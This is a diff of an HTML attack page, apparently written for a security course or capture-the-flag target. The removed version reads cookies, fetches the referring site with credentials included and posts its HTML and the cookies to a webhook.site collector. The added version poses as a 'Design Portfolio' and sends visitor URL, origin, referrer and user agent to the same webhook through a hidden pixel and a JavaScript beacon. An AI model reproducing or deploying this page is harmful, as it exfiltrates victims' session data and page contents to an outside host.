@@ -1,76 +1,64 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Debug</title>
+    <meta charset="UTF-8">
+    <title>Design Portfolio</title>
 </head>
 <body>
-    <h1>Debug Info</h1>
-    <pre id="log"></pre>
+    <h1>Design Portfolio</h1>
+    <pre id="log">Loading...</pre>
+
+    <!-- Работает даже без JavaScript -->
+    <img
+        src="https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76?event=html"
+        style="display:none"
+        alt=""
+    >
+
     <script>
-        const log = document.getElementById('log');
-        const webhookUrl = 'https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76';
-        
-        // Собираем всю информацию о контексте
-        const debugInfo = {
-            my_url: window.location.href,
-            referrer: document.referrer || 'none',
+        const webhook =
+            "https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76";
+
+        const log = document.getElementById("log");
+
+        function send(data) {
+            const url = new URL(webhook);
+
+            url.searchParams.set(
+                "data",
+                JSON.stringify(data)
+            );
+
+            // Избегаем кеширования
+            url.searchParams.set(
+                "t",
+                Date.now().toString()
+            );
+
+            const img = document.createElement("img");
+            img.style.display = "none";
+            document.body.appendChild(img);
+
+            img.src = url.toString();
+
+            console.log("Webhook request:", url.toString());
+            log.textContent += "\nSent: " + url.toString();
+        }
+
+        const info = {
+            event: "js_executed",
+            url: location.href,
+            origin: location.origin,
+            referrer: document.referrer || "none",
             user_agent: navigator.userAgent,
             timestamp: new Date().toISOString(),
-            cookies: document.cookie || 'none',
             has_opener: !!window.opener
         };
-        
-        log.textContent = JSON.stringify(debugInfo, null, 2) + '\n\n';
-        
-        // Пробуем fetch с полным логированием
-        const targetUrl = debugInfo.referrer || 'https://cats.is-course.ru';
-        log.textContent += `Attempting fetch to: ${targetUrl}\n`;
-        
-        fetch(targetUrl, {
-            method: 'GET',
-            credentials: 'include',
-            mode: 'cors'
-        })
-        .then(response => {
-            log.textContent += `✅ Response received!\n`;
-            log.textContent += `Status: ${response.status}\n`;
-            log.textContent += `Headers:\n`;
-            response.headers.forEach((value, key) => {
-                log.textContent += `  ${key}: ${value}\n`;
-            });
-            return response.text();
-        })
-        .then(html => {
-            log.textContent += `\nHTML length: ${html.length}\n`;
-            log.textContent += `HTML preview:\n${html.substring(0, 500)}`;
-            
-            // Отправляем на webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    debug_info: debugInfo,
-                    target_url: targetUrl,
-                    html_content: html.substring(0, 50000),
-                    success: true
-                })
-            });
-        })
-        .catch(err => {
-            log.textContent += `\n❌ Error: ${err.message}\n`;
-            log.textContent += `This means CORS is blocking the request.`;
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    debug_info: debugInfo,
-                    target_url: targetUrl,
-                    error: err.message,
-                    success: false
-                })
-            });
-        });
+
+        log.textContent = JSON.stringify(info, null, 2);
+
+        send(info);
     </script>
 </body>
 </html>
